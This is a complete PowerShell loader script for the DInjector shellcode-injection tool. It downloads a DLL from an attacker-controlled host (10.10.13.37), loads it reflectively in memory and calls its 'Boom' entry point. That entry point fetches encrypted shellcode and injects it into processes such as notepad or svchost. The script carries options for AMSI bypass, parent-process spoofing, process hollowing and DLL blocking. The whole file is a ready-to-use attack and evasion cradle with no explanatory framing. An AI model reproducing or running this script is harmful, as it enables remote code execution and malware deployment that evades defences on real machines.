# MODULE
$M = "currentthread"

# LHOST
$H = "10.10.13.37"

# AMSI
$A = "True"

# DLL
$D = "DInjector.dll"

# SHELLCODE
$S = "enc"

# PASSWORD
$W = "Passw0rd!"

# IMAGE
$I = "C:\Windows\System32\svchost.exe"

# PROCESS
$P = "notepad"

# PARENT PROCESS
$PP = "explorer"

# BLOCK DLLS
$BD = "True"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $P = (Start-Process -WindowStyle Hidden -PassThru $P).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
if ($methods.Contains($M)) {
    try {
        $PP = (Get-Process $PP -ErrorAction Stop).Id
    }
    catch {
        $PP = 0
    }
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$W /image:$I /pid:$P /ppid:$PP /blockDlls:$BD"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
